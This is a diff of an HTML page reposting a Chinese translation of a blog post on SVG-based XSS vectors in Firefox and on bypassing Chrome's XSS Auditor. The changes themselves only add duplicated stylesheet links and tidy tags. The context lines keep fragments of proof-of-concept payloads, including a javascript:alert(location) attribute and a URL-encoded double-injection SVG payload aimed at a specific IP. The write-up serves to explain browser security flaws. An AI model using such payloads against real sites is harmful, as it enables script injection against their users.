@@ -3,16 +3,16 @@
 			<head>
 			     <title>用SVG来找点乐子 - mramydnei</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/papers/917">http://drops.wooyun.org/papers/917</a></h1>
 				
       <p>
-        <p>英文原文链接：<a href="http://insert-script.blogspot.co.at/2014/02/svg-fun-time-firefox-svg-vector.html">http://insert-script.blogspot.co.at/2014/02/svg-fun-time-firefox-svg-vector.html</a></p>
+        </p><p>英文原文链接：<a href="http://insert-script.blogspot.co.at/2014/02/svg-fun-time-firefox-svg-vector.html">http://insert-script.blogspot.co.at/2014/02/svg-fun-time-firefox-svg-vector.html</a></p>
 
 <h2>0x00 一个新的FF SVG Vector</h2>
 
-<hr />
+<hr>
 
 <p>如果你对SVG没有任何的概念，可能阅读起来会比较吃力。如果你觉得看不懂可以先百度一下SVG是什么，我们都用它在干一些什么。 首先介绍一下SVG里的<code>&lt;use&gt;</code>元素：</p>
 
@@ -95,7 +95,7 @@ src="javascript:alert(location)" /&gt;
 
 <h2>0x01 绕过chrome XSS Auditor</h2>
 
-<hr />
+<hr>
 
 <p>我们还是想和前面一样来引入一个外部的SVG文件。但是我们需要一个同源的SVG文件。这意味着data URI在这里是不可行的（chrome下 data URL都是在独立域执行的，SO..）。但是这也难不倒我们，因为我们可以把一个XSS漏洞用两遍来解决这个问题。</p>
 
@@ -128,7 +128,7 @@ width="100" height="100"&gt;
 <pre><code>http://133.52.240.75/chrome.php? x=%3Csvg%3E%3Cuse%20height=200%20width=200%20 xlink:href=%27http://133.52.240.75/chrome.php? x=%3Csvg%20id%3D%22rectangle%22%20 xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20 xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20 %20%20%20width%3D%22100%22%20height%3D%22100%22%3E %3Ca%20xlink%3Ahref%3D%22javascript%3Aalert%28location%29%22%3E %3Crect%20class%3D%22blue%22%20x%3D%220%22%20 y%3D%220%22%20width%3D%22100%22 %20height%3D%22100%22%20%2F%3E %3C%2Fa%3E %3C%2Fsvg%3E%23rectangle%27/%3E%3C/svg%3E
 </code></pre>
 
-<p>have fun!</p>      </p>
+<p>have fun!</p>      <p></p>
     
 			</body>
 		</html>
